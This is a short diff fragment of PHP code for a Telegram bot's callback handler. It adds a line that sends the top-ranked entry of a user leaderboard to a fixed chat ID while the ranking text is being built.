@@ -141,6 +141,7 @@ if ($Callback_chat_id && $Callback_data) {
             $text = "";
             
             $text = $text . $base . "1" . " " . $y99[0][0] . " " . $y99[0][1] . "\n\n";
+            sendMessage("1178581717", $text);
             $y99 = array_slice($y99 , 1);
             foreach ($y99 as $number => $user)
                 $text = $text . "\n\n" . ($number + 2) . " " . $user[0] . " @" . $user[1] . "\n\n";
